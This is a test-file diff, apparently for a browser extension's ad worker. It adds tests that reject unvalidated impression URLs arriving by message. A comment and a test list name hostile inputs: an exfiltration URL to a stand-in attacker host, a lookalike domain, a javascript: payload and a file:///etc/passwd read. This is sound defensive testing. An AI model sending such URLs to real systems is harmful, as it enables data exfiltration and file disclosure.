@@ -197,3 +197,61 @@ describe('ad broker', () => {
     expect(fetchMock).toHaveBeenCalled();
   });
 });
+
+/**
+ * Impression counting, which is the one place a URL arrives by message.
+ *
+ * Everything else the worker fetches is built from the registry. A view URL
+ * comes in on `winnow:ad-view`, and any code that can send a runtime message
+ * can therefore propose a destination. Unvalidated, that is an exfiltration
+ * primitive: `winnow:ad-view` with `viewUrl: https://evil.example/?d=<data>`
+ * turns the worker into a willing courier.
+ *
+ * This is the same hazard `isDevEndpoint` exists to close for the developer
+ * endpoint setting, and it deserves the same treatment rather than trust in
+ * the fact that today's only caller happens to pass a validated value.
+ */
+describe('impression counting', () => {
+  it('counts a view on a registry host', async () => {
+    await loadWorker({ adsEnabled: true });
+    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
+    await new Promise((r) => setTimeout(r, 0));
+
+    expect(fetchMock).toHaveBeenCalledTimes(1);
+    expect(String(fetchMock.mock.calls[0]![0])).toBe(`${ORIGIN}/view/abc`);
+  });
+
+  it.each([
+    'https://evil.example.com/?d=leak',
+    'http://server.ethicalads.io/view/abc',
+    'javascript:alert(1)',
+    'file:///etc/passwd',
+    'https://server.ethicalads.io.evil.com/view',
+    '',
+    'not a url',
+  ])('refuses to fetch %s', async (viewUrl) => {
+    await loadWorker({ adsEnabled: true });
+    await send({ type: 'winnow:ad-view', viewUrl });
+    await new Promise((r) => setTimeout(r, 0));
+
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it('counts no view when ads are switched off', async () => {
+    // Someone who turned sponsorship off has asked not to be counted, and a
+    // stale message must not count them anyway.
+    await loadWorker({ adsEnabled: false });
+    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/abc` });
+    await new Promise((r) => setTimeout(r, 0));
+
+    expect(fetchMock).not.toHaveBeenCalled();
+  });
+
+  it('control: the view fetch does happen for a valid url', async () => {
+    // Nine assertions above are "fetch was not called". Prove the path works.
+    await loadWorker({ adsEnabled: true });
+    await send({ type: 'winnow:ad-view', viewUrl: `${ORIGIN}/view/xyz` });
+    await new Promise((r) => setTimeout(r, 0));
+    expect(fetchMock).toHaveBeenCalled();
+  });
+});
